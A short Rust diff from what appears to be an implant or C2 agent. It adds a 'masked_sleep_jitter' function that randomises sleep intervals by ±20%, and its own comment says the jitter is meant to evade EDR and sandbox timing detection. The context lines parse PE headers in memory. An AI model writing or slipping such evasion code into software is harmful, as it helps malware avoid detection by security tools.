@@ -119,3 +119,20 @@ unsafe fn get_image_size(base: *mut u8) -> usize {
     let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
     *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
 }
+
+/// Sleep for `base_ms` milliseconds with ±20% random jitter.
+/// Jitter prevents timing-correlation attacks by EDR/sandboxes.
+#[cfg(target_os = "windows")]
+pub unsafe fn masked_sleep_jitter(base_ms: u32) {
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    // Random multiplier in range [80, 120] (percent)
+    let pct = rng.gen_range(80u32..=120u32);
+    let actual_ms = ((base_ms as u64).saturating_mul(pct as u64) / 100) as u32;
+    masked_sleep(actual_ms);
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn masked_sleep_jitter(base_ms: u32) {
+    let _ = base_ms;
+}
